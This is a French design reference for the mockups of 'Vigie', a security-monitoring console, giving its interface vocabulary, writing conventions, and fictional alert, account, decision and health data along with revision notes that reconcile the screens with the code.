# Console de la Vigie : lexique, données fictives et contenu des écrans

Référence commune des maquettes de la console (MV-01 à MV-10). Une maquette n'invente ni un mot ni une donnée : elle prend ici ce dont elle a besoin ; ce qui manque s'ajoute ici d'abord. Elles reposent sur le commun des maquettes de l'administration (`../audit-ergonomie-2026-10-16/maquettes/_commun/` : jetons, polices, `admin.css`, `admin-plus.css`, `annotations.css`) et sur `_vigie/vigie.css` pour ce qui est propre à la console. Les règles de la planche MQ-00, du lexique de l'administration et de la grille (`../audit-ergonomie-2026-10-16/maquettes/GRILLE.md`) valent ici aussi.

## 0. Ce qu'est la console

- Une **application à part** : adresse `https://vigie.nicephos.art`, autre origine que l'admin du site (une faille de l'admin ne lit ni n'agit sur la console). Trois verrous avant d'y entrer : Cloudflare Access, jeton Access vérifié, connexion Zitadel propre à la console avec **second facteur**.
- Le **même langage visuel** que l'administration (jetons, typographie, barre latérale, panneaux, boutons, thèmes « Chambre noire » et clair selon le système) ; une marque propre : « Vigie » à la place de « Nicephos » en tête de la barre latérale, avec la mention « Sécurité de Nicephos ».
- **Langue** : français seulement (deux administrateurs francophones ; pas de sélecteur de langue). Utilisable sur iPhone.
- **Sans script obligatoire** : tout se fait par liens et formulaires ; un script local facultatif rafraîchit la vue d'ensemble toutes les 30 s.
- CSP stricte sans `unsafe-inline`, `frame-ancestors 'none'`, `noindex`.

## 1. Lexique

| On écrit | Ce que cela désigne | On n'écrit pas |
|---|---|---|
| **Vigie** | Le composant de sécurité et sa console. | « SIEM », « dashboard », « monitoring » |
| **alerte** | Une situation à examiner, ouverte par une règle ou par le score d'une entité. | « incident » (réservé au classement), « ticket » |
| **événement** | Une ligne du journal (venue du site, de Zitadel, de la bordure ou de la Vigie). | « log », « trace » |
| **source** | D'où vient le signal : **site**, **Zitadel**, **bordure Cloudflare**, **contrôles de la Vigie**. | « provider », « capteur » |
| **règle** | Ce qui ouvre une alerte (format Sigma) ; son **cas** (DS1…DS32) renvoie à l'étude. | « détection » seule |
| **entité** | Ce que vise une alerte : **adresse**, **réseau**, **compte**, **session**. | « asset », « objet » |
| **score** | Points d'une entité, qui perdent la moitié de leur valeur chaque heure. | « risque » |
| **quorum** | Deux sources au moins pour une alerte de score. | « corrélation » |
| **gravité** | **Critique**, **Haute**, **Moyenne**, **Basse**, **Info** ; toujours pastille **et** mot. | couleur seule |
| **mode d'une règle** | **Arrêt**, **Observer**, **Alerter**, **Bloquer**. | « silencieux », « actif » |
| **interrupteurs** | **Détection**, **Alertes**, **Blocages automatiques** ; « Marche » / « Arrêt pendant 1 h ». | « kill switch » |
| **décision** | Ce que le site applique : **Bloquer une adresse**, **Fermer une session**, **Fermer les sessions d'un compte**, **Geler un compte**, **Verrouiller l'admin** ; **Lever** pour annuler. | « ban », « révoquer » dans l'interface (le code dit `revoquer`) |
| **portée** d'un blocage | **Tout le site**, **L'admin et la connexion**, **La connexion seulement**. | `tout`, `admin`, `auth` |
| **Prendre en charge** / **Classer** | Statuts d'une alerte : **Ouverte**, **Prise en charge**, **Close** ; classement **Incident confirmé**, **Faux positif**, **Test**, **Sans suite** (clôture automatique après 7 jours). | « acquitter » |
| **D'où vient le signal** | La chronologie des événements d'une alerte : heure à la source, écart jusqu'à la réception, composant, émetteur, confiance (**constaté**, **rapporté**). | « evidence » |
| **ré-authentification** | « Confirmez votre identité » (Zitadel, `max_age=300`) avant une action forcée ou un interrupteur. | « sudo » |
| rôles de la console | **Lecteur**, **Intervenant**, **Analyste**, **Administrateur** (`vigie.viewer`, `vigie.handler`, `vigie.analyst`, `vigie.admin`) ; **plafond** (Zitadel) et **attribution** (Vigie) : le droit effectif est le plus faible des deux. | « RBAC » |
| **Lectrice** | Le rôle Lecteur dit d'une femme (Camille), dans le pied de la barre latérale et dans la note de rôle (ajout MV-01). | « Lecteur » pour Camille |
| **Réponse déjà faite** | Les décisions que la Vigie a prises seule pour une alerte (mode Bloquer), en tête de sa fiche, avec « Lever… » (ajout MV-02). | « remédiation », « réponse auto » |
| **Geler 7 jours** · **Bloquer 24 h** | Un bouton d'action forcée dit l'effet ET la durée ; sans script, un bouton par durée (ajout MV-02). | « Appliquer », « Valider », « Geler » seul |
| **Lever le gel…** · **Lever…** | Mène à la confirmation de la levée d'une décision ; les points de suspension disent qu'une question suit (ajout MV-02). | « Annuler » une décision |
| **Classer et clore l'alerte** | Le bouton du classement (Incident confirmé, Faux positif, Test) ; il dit que l'alerte se clôt (ajout MV-02). | « Enregistrer » |
| **Confirmez votre identité** · **Confirmer dans Zitadel** | Le titre et le bouton de la ré-authentification (ajout MV-02). | « Se reconnecter » |
| **(tronquée)** | Écrit à côté d'une adresse tronquée pour un Lecteur : « 198.51.100.0/24 (tronquée) » (ajout MV-01). | une troncature sans le dire |
| **constaté** · **rapporté** | La confiance d'un événement, en toutes lettres ; « constaté » porte ✓ (ajout MV-02, d'après l'annexe § 4.6). | « vérifié », « fiable » |

Mots des interrupteurs, en clair : « Détection : les règles tournent » ; « Alertes : notifications Signal et e-mail » ; « Blocages automatiques : les règles en mode Bloquer agissent d'elles-mêmes ».

## 2. Écriture

Mêmes règles que l'administration : espaces fines insécables avant « : ; ! ? », dates abrégées dans l'interface (« sam. 17 oct., 14 h 02 »), heures « 14 h 02 » (heure de Paris), nombres « 1 248 ». Adresses IP en police à chasse fixe. Pour un **Lecteur**, adresses tronquées (« 203.0.113.0/24 », « 2001:db8:4::/48 »).

## 3. Données fictives

Journée de référence : **samedi 17 octobre 2026**, maquettes montrées à **14 h 20** (heure de Paris). Adresses des plages de documentation seulement (RFC 5737, RFC 3849).

Les tableaux de référence (§ 3.1 à 3.6) disent l'**état final**, après les arbitrages des § 3.9 et § 3.13 ; les § 3.7 à 3.13 restent l'historique, tels qu'ils ont été écrits. Chaque correction de la consolidation du 18 oct. est marquée **(consol.)**, celles de la passe 2 (arbitrages du § 3.14) **(passe 2)**, avec ce qu'elles remplacent et l'arbitrage qui les fonde. L'outil `coherence-vigie.py` relève dans les dix pages les numéros, les heures, les adresses et les comptes, et les compare à ces tableaux et à ce lexique.

### 3.1 Personnes et comptes

| Personne | Compte (sub Zitadel) | Rôle sur le site | Rôle dans la console |
|---|---|---|---|
| Sébastien | `zitadel-318204411` | Administrateur | Administrateur |
| Julien | `zitadel-318204977` | Administrateur | Administrateur |
| Camille (relectrice) | `zitadel-320551024` | Relectrice, sans `securite.voir` **(consol. : « Relecteur » ; § 3.12)** | Lectrice : plafond `vigie.viewer` depuis le ven. 16 oct., 18 h 25, aucune attribution **(consol. : « — (aucun rôle `vigie.*`) », vrai jusqu'à 18 h 25 ; § 3.12)** |
| compte inconnu | `zitadel-329906113` | Administrateur, donné hors de l'application à 14 h 02 **(consol. : « — » ; § 3.3)** | — |

Le nom à côté du sub vient du dernier contrôle des rôles (sauvegarde du site) : **à créer** (le contrôle ne garde aujourd'hui que les sub). Adresses des personnes : § 3.10 ; celle de Sébastien, `2001:db8:4:1c::5e` (son téléphone), sa dernière confirmation d'identité à 14 h 17 : § 3.11.

### 3.2 Alertes ouvertes du 17 oct. à 14 h 20

| # | Gravité | Règle (titre du code) | Cas | Entité | Sources | Occurrences | Première · dernière | Mode | Statut |
|---|---|---|---|---|---|---|---|---|---|
| 412 | Critique | Rôle donné, retiré ou compte changé hors de l'application | DS8 | compte `zitadel-329906113` | site **(consol. : « site, contrôles de la Vigie » ; § 3.9)** | 1 **(consol. : 2 ; § 3.9)** | 14 h 02 **(consol. : « 14 h 02 · 14 h 05 » ; § 3.9)** | Bloquer | Ouverte ; réponse : compte gelé 24 h (#87), sessions fermées 48 h (#88) **(consol. : numéros du § 3.13)** ; message Signal à 14 h 02 |
| 413 | Critique | Sauvegarde du site différente de ce qu'il déclare (administrateur non déclaré, déclencheur absent) | DS8 | site · comptes | contrôles de la Vigie | 1 | 14 h 05 | Alerter **(consol. : ligne ajoutée, § 3.9 ; mode du § 3.13)** | Ouverte ; message Signal à 14 h 05 ; alerte liée de #412 (le même compte) |
| 409 | Haute | Score d'une entité au-dessus du seuil, confirmé par deux sources | quorum | adresse `198.51.100.23` | site, bordure Cloudflare | 37 | 13 h 41 · 14 h 12 | Observer | Ouverte ; score 15,2 (site 9,1 · bordure 6,1) |
| 407 | Haute | Cookie d'une session fermée rejoué depuis un autre appareil | DS1 | compte `zitadel-318204977` (Julien) | site | 1 | 11 h 26 | Bloquer | Prise en charge par Sébastien à 11 h 41 ; réponse : sessions du compte fermées (#84) ; message Signal à 11 h 26 |
| 414 | Moyenne | Surveillance réduite (interrupteur ou règle arrêtés, adresse de confiance, référence acceptée) **(passe 3 : titre du code)** | DS24 | la Vigie · blocages automatiques | contrôles de la Vigie | 1 | 14 h 10 | Alerter | Ouverte ; ouverte par l'arrêt des blocages automatiques par Julien à 14 h 10 ; message Signal à 14 h 10 **(passe 2 : ligne ajoutée ; § 3.14, point 1)** |
| 405 | Moyenne | Score d'une entité au-dessus du seuil, confirmé par deux sources **(consol. : « Piège déclenché… », DS15 ; § 3.9)** | quorum | réseau `203.0.113.0/24` | site, bordure Cloudflare **(consol. : « site » ; § 3.9)** | 12 | 09 h 10 · 13 h 58 | Observer | Ouverte ; score 13,1 (site 8,4 · bordure 4,7) ; motif principal : Piège déclenché (DS15) |

**(consol. : ligne #401 retirée, § 3.9 : il n'existe pas d'alerte Basse ; l'événement Basse de 22 h 47 reste au journal, § 3.10.)** Ordre de toute liste et du résumé **(passe 2 : § 3.14, point 6)** : gravité, puis Ouverte avant Prise en charge, puis la plus récente d'abord : #413, #412, #409, #407, #414, #405. La vue d'ensemble compte **2 alertes critiques et 2 hautes**, et 2 moyennes (#414, #405) ; le résumé de l'admin du site, qui laisse de côté le mode Observer, **2 critiques et 1 haute** (#412, #413, #407), la plus grave étant à gravité égale la plus récente, #413, depuis 14 h 05 **(consol. : « 1 critique et 1 haute », § 3.12 ; § 3.13, point 1)** ; il compte aussi #414 (1 moyenne). L'admin n'en montre que les nombres, l'heure et le lien `/alertes/413`, sans titre de règle ; son badge : ▲ 3 (hautes et critiques) **(passe 2 : § 3.14, point 7)**.

Closes la veille (pour les filtres) : #398 Moyenne « Score d'une entité au-dessus du seuil, confirmé par deux sources », adresse `192.0.2.77`, sources site et Zitadel, motif principal « Échecs OIDC répétés depuis une adresse » (DS5), 6 occurrences, ven. 16 oct., 19 h 12 · 19 h 31, classée **Faux positif** par Julien à 20 h 05 (« box redémarrée ») **(consol. : « Échecs OIDC répétés depuis une adresse » ; § 3.9)** ; #396 Haute « Base du site restaurée », **Test**.

### 3.3 Chronologie de l'alerte #412 (« D'où vient le signal »)

| Heure à la source | Reçu | Événement | Gravité | Source · émetteur | Confiance |
|---|---|---|---|---|---|
| 14 h 02 min 11 | + 1 s | Compte changé hors de l'application (rôle Administrateur donné à `zitadel-329906113`) | Critique | site · base de données · déclencheur (hors application) | rapporté |
| 14 h 02 min 12 | — | Décision : compte gelé 24 h (#87), sessions fermées (#88) (Vigie · règle sigma.role_hors_application) **(consol. : numéros du § 3.13)** | Moyenne | contrôles de la Vigie | constaté |

**(consol. : ligne de 14 h 05 min 00 retirée, § 3.9 : le constat du contrôle des rôles ouvre #413 ; la fiche de #412 montre « Alerte liée : #413 ».)**

### 3.4 Décisions en cours

| # | Décision | Cible | Portée | Jusqu'au | Par | Motif |
|---|---|---|---|---|---|---|
| 88 | Fermer les sessions d'un compte **(consol. : « Geler un compte » ; § 3.13, point 3)** | `zitadel-329906113` | — | lun. 19 oct., 14 h 02 | Vigie · règle Rôle donné hors de l'application | alerte #412 |
| 87 | Geler un compte **(consol. : « Fermer les sessions d'un compte » ; § 3.13, point 3)** | `zitadel-329906113` | — | dim. 18 oct., 14 h 02 | Vigie · règle Rôle donné hors de l'application | alerte #412 |
| 86 | Bloquer une adresse | `203.0.113.0/24` | L'admin et la connexion (corrigé par MV-01, voir § 3.8) | sam. 24 oct., 10 h 00 | Sébastien | « scanner depuis mardi » |
| 84 | Fermer les sessions d'un compte | `zitadel-318204977` (Julien) | — | lun. 19 oct., 11 h 26 | Vigie · règle Cookie rejoué | alerte #407 |

Le code crée le gel, puis la fermeture des sessions (`vigie/moteur.js`, `respond`) : le gel a le plus petit numéro. Liste du plus récent au plus ancien : #88, #87, #86, #84.

États de MV-05 (hypothèses, après 14 h 20) **(passe 2 : § 3.14, point 2)** : #89, Bloquer une adresse, `198.51.100.23`, L'admin et la connexion, 24 h, créée par Sébastien à 14 h 23 (« scanner de l'alerte #409 »), lue par le site à 14 h 23, jusqu'au dim. 18 oct., 14 h 23 ; gel #87 levé par Sébastien à 14 h 24.

### 3.5 Interrupteurs, santé, chiffres

- Interrupteurs : chaque carte montre l'état et un seul « Arrêter… » ; motif et durées sont sur la page de confirmation **(finitions : § 3.16, point 5)**. Détection **Marche** ; Alertes **Marche** ; Blocages automatiques **Arrêt jusqu'à 15 h 10** (arrêté par Julien à 14 h 10 pour 1 h, « essai de la bordure » ; corrigé par MV-01, voir § 3.8). « Jusqu'à demain 8 h », l'une des durées d'un arrêt, vaut ici dim. 18 oct., 08 h 00 (§ 3.11).
- Santé : dernier battement du site 14 h 19 ; événements en attente sur le site 0 ; Zitadel lu à 14 h 19 ; bordure : dernier battement du Worker 14 h 15, liste 31 (1 blocage) copiée à 14 h 03 **(consol. : « 4 blocages » ; § 3.9)** ; contrôle des rôles : sauvegarde de 14 h 04, contrôlée à 14 h 05, **écart** (alerte #413), contrôle précédent à 13 h 05 sur la sauvegarde de 13 h 04, conforme **(consol. : « sauvegarde de 03 h 00, écart (alerte #412) » ; § 3.9 et § 3.12)** ; chaîne vérifiée à 03 h 10, intacte (1 182 406 lignes) ; base 512 Mo, sauvegardes 7,1 Go, disque libre 182 Go ; retard d'analyse 0 ; listes de menaces mises à jour à 04 h 12 (Spamhaus DROP 1 498, Feodo 312, Tor 1 207) ; Signal : dernier message 14 h 10, #414 ; 4 messages ce jour (#407 à 11 h 26, #412 à 14 h 02, #413 à 14 h 05, puis « Surveillance réduite : blocages automatiques arrêtés jusqu'à 15 h 10 » à 14 h 10 : un message à chaque geste, hors du plafond **(passe 3 : § 3.15, point 1)**), chacun avec sa réponse (« Réponse : compte gelé 24 h, sessions du compte fermées », « Aucune réponse automatique » ; texte exact de `responseOf`, **passe 3**) **(passe 2 : « 14 h 05, 3 messages » ; § 3.14, points 1 et 8 ; consol. : « 14 h 02 »)** ; e-mail : réglé, jamais utilisé.
- Ré-authentification : identité de Sébastien confirmée à 14 h 17 (sa connexion), valable jusqu'à 14 h 22 ; dite en une ligne d'en-tête **(passe 2 : § 3.14, point 16)**.
- Affaiblir la surveillance **(passe 2 : § 3.14, point 1)** : l'adresse de confiance `192.0.2.140` (box de Camille), ajoutée par Sébastien le ven. 16 oct., 18 h 40, vaut 7 jours, jusqu'au ven. 23 oct., 18 h 40 ; « Accepter comme référence » est refusé tant que #413 est ouverte. Hypothèses dessinées : arrêt de la Détection pour 4 h, de 14 h 21 à 18 h 21, demandé à 14 h 21 (page de confirmation, MV-06) ; #413 classée, sauvegarde de 15 h 04 contrôlée à 15 h 05 avec un déclencheur réécrit par la mise à jour 1.91.0 du site, acceptée comme référence, sans durée : elle remplace la référence **(passe 3 : § 3.15, point 4)** (MV-07).
- Retours après une action, à 14 h 21 **(passe 2 : § 3.14, point 2)** : blocages automatiques remis en marche (MV-01) ; #412 prise en charge (MV-02) ; essai des canaux (MV-06) ; attribution de Camille changée (MV-08).
- Règles : **54** au registre, dont « Surveillance réduite » (Alerter, mode figé) ; 2 en Bloquer, **6 en Alerter** (preuves DS8 sans réponse possible, chaîne rompue, surveillance réduite), 46 en Observer **(passe 3 : « 53 », « 5 en Alerter » ; code de main, PR #118 ; consol. : « 51 en Observer »)**. En fin d'arrêt, une règle reprend le mode qu'elle avait avant **(passe 3)**.
- Résumé pour l'admin du site (`GET /v1/resume`, MV-10) : 2 critiques, 1 haute et 1 moyenne (#414) **(passe 3 : comme MV-10 depuis la passe 2)**, la plus grave #413, critique, depuis 14 h 05, sans titre de règle **(passe 3 : `plus_grave` = numéro, gravité, depuis ; PR #121)**, `critique_a_prendre` vrai. Hypothèse « résumé indisponible » : dernier résumé reçu à 14 h 10, indisponible depuis 14 h 11, bandeau daté **(consol. : § 3.12 et § 3.13, point 6)**.
- Messages « Surveillance réduite » **(finitions : § 3.16, point 6 ; PR #124)** : un par geste, hors du plafond des alertes, au-delà de 60 par heure une synthèse au début de l'heure suivante (« … 4 autre(s) geste(s) l’heure précédente, non envoyés un à un (plus de 60 par heure). ») ; apostrophe typographique : « [Moyenne] Surveillance réduite : blocages automatiques arrêtés jusqu’à 15 h 10 » (#414) ; descente de mode, les modes en mots de la console : « [Moyenne] Surveillance réduite : règle « Cookie d'une session fermée rejoué depuis un autre appareil » passée de Bloquer à Observer » (exemple de MV-10, à 14 h 20) ; seuil : « seuil d’une adresse relevé de 7 à 9 points ».
- E-mail de secours **(finitions : § 3.16, point 7)** : l'adresse d'envoi est protégée par SPF, DKIM et DMARC ; avec la clé d'accès exigée par la console et le favori (« Ouvrez la Vigie depuis votre favori ; elle ne demande jamais votre mot de passe par message. »), c'est ce qui déjoue une imitation.
- Flux du jour **(MV-11 : § 3.17 ; refonte du § 3.18)**, sam. 17 oct. de 0 h à 14 h 20, comme le journal de MV-03 (le § 3.17 dit « 24 h » ; « aujourd'hui » garde les mêmes 319 événements) : **319 événements** hors routine masquée (le 319e, l'arrêt des blocages par Julien à 14 h 10, s'ajoute aux 318 du § 3.10 ; par source : site 241, bordure 38, Zitadel 19, contrôles de la Vigie 21). Par origine : hors application 16 (dont 14 contrôles des rôles conformes), la Vigie elle-même 6, comptes de l'admin 26, visiteurs du site public 220, réseaux listés 32, Zitadel 19. Par chemin (ceux du code, § 3.18) : preuve directe 4 (#413 contrôles, #412 site, #407 site, #414 contrôles), score d'une entité 236 (au-dessus du seuil : #409, site 26 et bordure 11 ; #405, site 9 et bordure 3 ; sous le seuil 187), corrélation 0, sans point 79. Issues : Critique 2 alertes (2 événements), Haute 2 (38), Moyenne 2 (13), sans alerte 266. Les 6 alertes par origine : hors application 2 (#413, #412), visiteurs du site public 2 (#409, #405), comptes de l'admin 1 (#407), la Vigie elle-même 1 (#414) ; la barre de provenance de MV-01 est la même, par origine **(finitions de MV-11 : § 3.19, point 2 ; elle était par source)**. Suites, hors des diagrammes : réponses #87, #88 (#412) et #84 (#407) ; 4 messages Signal (#407, #412, #413, #414). Provenances, sans le trafic des administrateurs (9 événements, non comptés) : 198.51.100.23 44 événements, réseau 203.0.113.0/24 31, 192.0.2.214 1, 194 autres ; opérateurs vus par la bordure (36 de 38) : AS64501 (198.51.100.23, hébergeur, Pays-Bas) 14, 9 autres opérateurs 22 ; pays : Pays-Bas 15, États-Unis 10, France 7, Allemagne 4. Hypothèses de MV-11 : 7 jours, du dim. 11 au sam. 17 oct., 2 845 événements et 11 alertes (6 ouvertes ; les closes avant le 16 oct. sans numéro) ; journée calme, jeu. 15 oct., 206 événements, aucune alerte.
- Sur 7 jours : 64 connexions à l'admin, 4 adresses bloquées, 1 913 tentatives repoussées (pièges, saisies malveillantes, refus de droit, blocages).

### 3.6 Droits de la console

| Personne | Plafond (Zitadel) | Attribution (Vigie) | Droit effectif | Depuis |
|---|---|---|---|---|
| Sébastien | Administrateur | Administrateur | Administrateur | amorce `VIGIE_ADMIN_SUBS` (à l'installation) |
| Julien | Administrateur | Administrateur | Administrateur | amorce `VIGIE_ADMIN_SUBS` (à l'installation) |
| Camille | Lecteur (`vigie.viewer`, donné par Sébastien le ven. 16 oct., 18 h 25) | — (pas encore attribuée ; état de MV-08 : Lecteur, attribuée par Sébastien à 14 h 21, **passe 2**) | Lectrice **(consol. : « Lecteur » ; § 1)** | ven. 16 oct., 18 h 30 (première connexion ; refusée à 18 h 12 sans rôle, § 3.12) |

L'arrivée de Camille sans attribution est notée au journal des droits et signalée aux Administrateurs (DS29, Moyenne) ; un changement de droits est Haute **(consol. : § 3.13, point 5)**. Sébastien et Julien sont dans l'amorce `VIGIE_ADMIN_SUBS` : elle l'emporte, « Rendre Julien Analyste » est refusé tant qu'il y figure (`vigie.env`) **(passe 2 : § 3.14, point 10)**. Pour lui couper l'accès, retirer son plafond `vigie.*` dans Zitadel : il perd l'accès dans les 5 minutes, et ne peut plus agir dès la requête suivante (la console relit le plafond toutes les 5 minutes et avant toute action, à créer en D3) **(finitions : § 3.16, point 3)**.

### 3.7 Compléments des maquettes MV-01 et MV-02 (ajoutés le 18 oct. 2026)

Ce qui manquait pour dessiner les états ; à reprendre tel quel dans les autres maquettes.

- **Vue d'ensemble « aucune alerte » (MV-01)** : ven. 16 oct., 21 h 00, après le classement de #398 (20 h 05) et avant l'ouverture de #401 (22 h 47) : aucune alerte ouverte, aucune décision en cours, les trois interrupteurs en marche, santé sans écart.
- **Écart d'intégrité (MV-01, hypothèse ; MV-07 la reprend)** : la vérification de 03 h 10 trouve la chaîne rompue à la ligne **1 181 950**, raison « ligne modifiée ou insérée » (texte de `vigie/store.js`) ; elle ouvre l'alerte critique « Chaîne du journal de la Vigie rompue » (DS20, règle `chaine_rompue`), sans numéro dans la maquette.
- **Alerte #409, détail** : 37 occurrences = **31 événements du site** (`site · public` : pièges et pages introuvables, rapportés) + **6 constats de la bordure Cloudflare** (rafales de pages, constatés) ; score 15,2 (site 9,1 · bordure 6,1) ; seuil d'une adresse 7 points (`vigie/poids.js`), « Haute » au double (14) ; quorum de 2 sources atteint.
- **Alerte #398, détail** : remplacé par le § 3.9 (alerte de score, sources site et Zitadel, motif principal DS5).
- **Alerte #412, message envoyé** (texte exact de `vigie/notifications.js`, `messageOf`, sources à l'ouverture : site) au groupe Signal « Vigie Nicephos » à 14 h 02 :

  ```
  [Critique] Rôle donné, retiré ou compte changé hors de l'application
  Source : site
  14 h 02 · https://vigie.nicephos.art/alertes/412
  ```

- **Alerte #412, entité** : nom « inconnu » (absent du dernier contrôle des rôles) ; score sans objet (preuve à source unique) ; autre alerte : #413, liée (§ 3.9) ; depuis le § 3.9, #412 n'a plus qu'**1 occurrence, à 14 h 02, source site** (le constat de 14 h 05 est #413) ; aucune adresse (le changement vient de la base, sans requête), donc pas de « Bloquer une adresse ».
- **Ré-authentification (MV-02)** : demandée après « Geler 7 jours », la dernière confirmation de Sébastien datant de plus de 5 minutes ; route `POST /reauth` (à créer).
- **Sébastien et Camille** : avatar « S » ; Camille voit la console en Lectrice (§ 3.6).

### 3.8 Écarts relevés par MV-01 et MV-02 (avec le code, ou dans ce lexique)

Corrigés ici (sans quoi les maquettes se contredisaient à l'écran) :

1. **Blocages automatiques arrêtés à 14 h 00, gel automatique à 14 h 02** : le code ne répond jamais quand l'interrupteur des blocages est arrêté (`vigie/moteur.js`, `respond`). L'arrêt passe à **14 h 10, pour 1 h, jusqu'à 15 h 10** (§ 3.5).
2. **Réseau 203.0.113.0/24 bloqué sur « Tout le site » depuis 10 h 00, pièges déclenchés jusqu'à 13 h 58 (#405)** : le site refuse toute requête d'une adresse bloquée avant toute route ; les pièges ne se déclencheraient plus. La portée de #86 passe à **L'admin et la connexion** (§ 3.4).

Tranchés au § 3.9 (arbitrages du 18 oct. 2026), repris dans MV-01 et MV-02 :

3. **Tranché au § 3.9.** **#405, #401 et #398 portent le titre de règles à points** (`piege`, `bordure_nouvel_operateur`, `oidc_echecs_repetes` : `points`, sans `source_unique`) : dans le code, elles déposent des points et n'ouvrent pas d'alerte seules ; l'alerte serait « Score d'une entité au-dessus du seuil… » (quorum) ou celle d'un détecteur (`detecteur.exploration_lente`, DS15 ; `detecteur.premiere_apparition`, DS4), dont le titre du code est brut (« exploration lente ») : titres lisibles des détecteurs **à créer**.
4. **Tranché au § 3.9.** **Le constat du contrôle des rôles (14 h 05) compté dans #412** : dans le code, il ouvre sa propre alerte, « Sauvegarde du site différente de ce qu'il déclare (administrateur non déclaré, déclencheur absent) » (règle `controle_roles`, entité `site · comptes`). MV-02 le montre dans #412 et déclare **à créer** le rattachement des constats qui portent sur le même compte.
5. **Tranché au § 3.9.** **« Contrôle des rôles : sauvegarde de 03 h 00, écart »** (§ 3.5) alors que l'écart est constaté à 14 h 05 sur une sauvegarde postérieure au changement de 14 h 02 : MV-01 écrit « écart à 14 h 05 (#412) » ; l'heure de la sauvegarde lue est à fixer (MV-07).
6. **Tranché au § 3.9.** **« Liste 31 (4 blocages) copiée à 14 h 03 »** alors qu'une seule décision d'adresse est en cours (#86) : à expliquer (blocages expirés entre-temps ?) ou à corriger avant MV-07.

### 3.9 Arbitrages du 18 oct. 2026 (écarts 3 à 6 du § 3.8) : à reprendre dans toutes les maquettes

Le code fait foi : la maquette montre ce que la Vigie produit réellement.

1. **Une règle à points n'ouvre jamais d'alerte seule.** Seules ouvrent une alerte : une règle à source unique, un détecteur à source unique (rôle incohérent, chaîne d'attaque, site silencieux) et le **score d'une entité** (« Score d'une entité au-dessus du seuil, confirmé par deux sources », gravité Moyenne au seuil, Haute au double). Conséquences :
   - **#405** devient : **Moyenne**, « Score d'une entité au-dessus du seuil, confirmé par deux sources », cas quorum, entité **réseau `203.0.113.0/24`**, sources **site, bordure Cloudflare**, score 13,1 (site 8,4 · bordure 4,7 ; seuil d'un réseau 12), **motif principal : « Piège déclenché (chemin de scanner, lien caché, champ piège) » (DS15)**, 12 occurrences, 09 h 10 · 13 h 58, Observer, Ouverte. Le « motif principal » est la règle qui a déposé le plus de points sur l'entité (signaux `vigie_signal`) : affichage **à créer**.
   - **#401** est retiré (il n'existe pas d'alerte Basse dans le code : le score ouvre en Moyenne ou Haute, les preuves à source unique sont au moins Moyennes). La gravité **Basse** ne se voit que dans les **événements** (MV-03).
   - **#398** (close la veille) devient : **Moyenne**, « Score d'une entité au-dessus du seuil, confirmé par deux sources », entité adresse `192.0.2.77`, sources **site, Zitadel**, motif principal « Échecs OIDC répétés depuis une adresse » (DS5), 6 occurrences, ven. 16 oct., 19 h 12 · 19 h 31, Observer ; classée **Faux positif** par Julien le ven. 16 oct., 20 h 05, note « box redémarrée ».
2. **Le contrôle des rôles ouvre sa propre alerte : #413**, **Critique**, « Sauvegarde du site différente de ce qu'il déclare (administrateur non déclaré, déclencheur absent) », cas DS8, entité **site · comptes**, source **contrôles de la Vigie**, 1 occurrence, 14 h 05, mode **Observer** (mode du code), **Ouverte**. La chronologie de #412 ne garde que l'événement du site (14 h 02 min 11) et la décision (14 h 02 min 12) ; la fiche de #412 montre **« Alerte liée : #413 (le même compte, vu par le contrôle des rôles) »** : rapprochement par le compte cité dans le détail du contrôle, **à créer**. La vue d'ensemble compte donc **2 alertes critiques** (#412, #413) **et 2 hautes** (#409 ouverte, #407 prise en charge).
3. **Sauvegardes du site horaires** sur cette instance (`BACKUP_INTERVAL_HOURS=1`, recommandé avec la Vigie pour que le contrôle des rôles suive de près) : santé « Contrôle des rôles : sauvegarde de 14 h 04, contrôlée à 14 h 05 : écart (#413) ».
4. **Bordure : « liste 31 (1 blocage) copiée à 14 h 03 »** : la liste de la bordure ne contient que les blocages d'adresses en cours (#86).

Les alertes ouvertes du 17 oct. à 14 h 20 sont donc : #412 (Critique, Ouverte), #413 (Critique, Ouverte), #409 (Haute, Ouverte), #407 (Haute, Prise en charge), #405 (Moyenne, Ouverte).

### 3.10 Compléments de MV-03 et MV-04 (ajoutés le 18 oct. 2026)

Ce qui manquait pour dessiner le journal et les fiches d'entité ; à reprendre tel quel dans les autres maquettes.

**Mots**

| On écrit | Ce que cela désigne | On n'écrit pas |
|---|---|---|
| **Sans la routine** · **Avec la routine** | Le filtre « Type » du journal ; la routine, masquée par défaut et comptée : battements du site (`sys_heartbeat`), états du site (`sys_state`), signaux notés par la Vigie (`vigie_signal`). | « bruit », « logs techniques » |
| **Heure à la source · reçu** | L'en-tête de la colonne du temps (MV-03, MV-04) ; « à la minute » pour la bordure, dont la Vigie lit les constats minute par minute (`survenu_a: r.minute`). | « timestamp » |
| **Vue avec** | Le titre des liens d'une entité (`entity_links`, 90 jours) : réseau, comptes, sessions. | « relations », « graphe » |
| **Réponse automatique** | Ce que la Vigie ferait d'elle-même sur une entité, et ce qui l'en empêche (mode de la règle, interrupteur, protection). | « remédiation » |
| **Protégée : vue avec un administrateur** | La pastille d'une adresse jamais bloquée automatiquement (vue avec un administrateur dans les 30 jours ; aussi « privée », « de confiance »). | « liste blanche » |
| **Exporter les 318 en CSV** | Le lien d'export du journal filtré, réservé aux Analystes et aux Administrateurs ; il dit le nombre. | « Télécharger » seul |
| **Extrait réservé aux Analystes et aux Administrateurs.** | Ce que lit un Lecteur à la place de l'extrait d'une saisie malveillante. | un extrait masqué sans le dire |

Libellés lisibles des types (à créer dans le code, qui n'a que les noms d'OWASP ; le code reste écrit dessous en chasse fixe) : `token_guess` Jeton ou code faux · `zitadel_connexion` Connexion chez Zitadel · `zitadel_echec` Échec d'authentification chez Zitadel · `session_created` Session ouverte · `session_destroyed` Session fermée · `session_use_after_expire` Cookie d'une session fermée réutilisé · `authn_login_success` Connexion réussie · `malicious_honeypot` Piège déclenché · `malicious_input` Saisie malveillante · `malicious_excess_404` Pages introuvables en rafale · `privilege_permissions_changed` Droits d'un compte changés · `bordure_rafale` Rafale de pages vue en bordure · `bordure_blocage` Requêtes bloquées en bordure · `bordure_nouvel_operateur` Page de l'admin servie depuis un opérateur jamais vu · `vigie_alerte` Alerte ouverte · `vigie_decision` Décision prise · `vigie_interrupteur` Interrupteur changé · `vigie_controle_roles` Contrôle des rôles.

**Adresses** (toutes des plages de documentation ; opérateurs AS64500 à AS64502, RFC 5398)

| Adresse | Qui ou quoi |
|---|---|
| `2001:db8:4:1c::5e` | Sébastien, au téléphone (opérateur mobile AS64500, jamais vu en bordure : constat Basse à 14 h 15) |
